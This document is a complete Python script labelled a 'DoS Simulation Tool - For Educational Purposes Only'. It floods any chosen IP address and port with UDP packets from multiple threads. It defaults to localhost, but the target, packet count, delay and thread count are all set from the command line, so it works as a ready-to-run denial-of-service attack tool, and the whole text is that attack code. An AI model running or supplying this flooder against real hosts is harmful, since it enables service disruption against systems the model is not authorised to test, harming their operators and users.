import socket
import threading
import time
import random
import argparse

class DoSSimulator:
    def __init__(self):
        self.running = False
        self.threads = []
        self.sockets = []

    def send_packets(self, target_ip, target_port, num_packets, delay, thread_id):
        """Worker thread function to send packets"""
        try:
            # Create a socket for each thread
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sockets.append(s)
            
            # Vary packet size slightly to simulate real traffic
            base_packet = b"DoS Simulation Packet - Thread " + str(thread_id).encode() + b" "
            
            for i in range(num_packets):
                if not self.running:
                    break
                
                # Add some random data to vary packet size
                random_data = bytes([random.randint(0, 255) for _ in range(random.randint(0, 50))])
                packet = base_packet + random_data
                
                s.sendto(packet, (target_ip, target_port))
                if i % 100 == 0:  # Reduce console output frequency
                    print(f"Thread {thread_id}: Sent packet {i+1}/{num_packets}")
                if delay > 0:
                    time.sleep(delay)
                    
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")

    def start_attack(self, target_ip, target_port, num_packets, delay, num_threads):
        """Start the DoS simulation with multiple threads"""
        self.running = True
        packets_per_thread = num_packets // num_threads
        
        print(f"Starting attack with {num_threads} threads...")
        print(f"Each thread sending {packets_per_thread} packets to {target_ip}:{target_port}")
        
        # Create and start worker threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.send_packets,
                args=(target_ip, target_port, packets_per_thread, delay, i)
            )
            self.threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in self.threads:
            thread.join()
            
        print("Attack completed")

    def stop_attack(self):
        """Gracefully stop the attack"""
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass
        print("Attack stopped")

def main():
    print("Enhanced DoS Simulation Tool - For Educational Purposes Only")
    print("-----------------------------------------------------------")
    
    parser = argparse.ArgumentParser(description='DoS Simulation Tool')
    parser.add_argument('--target-ip', help='Target IP address', default='127.0.0.1')
    parser.add_argument('--target-port', type=int, help='Target port number', default=8080)
    parser.add_argument('--packets', type=int, help='Total number of packets to send', default=1000)
    parser.add_argument('--delay', type=float, help='Delay between packets (seconds)', default=0.01)
    parser.add_argument('--threads', type=int, help='Number of threads to use', default=10)
    
    args = parser.parse_args()
    
    simulator = DoSSimulator()
    
    try:
        simulator.start_attack(
            args.target_ip,
            args.target_port,
            args.packets,
            args.delay,
            args.threads
        )
    except KeyboardInterrupt:
        simulator.stop_attack()

if __name__ == "__main__":
    main()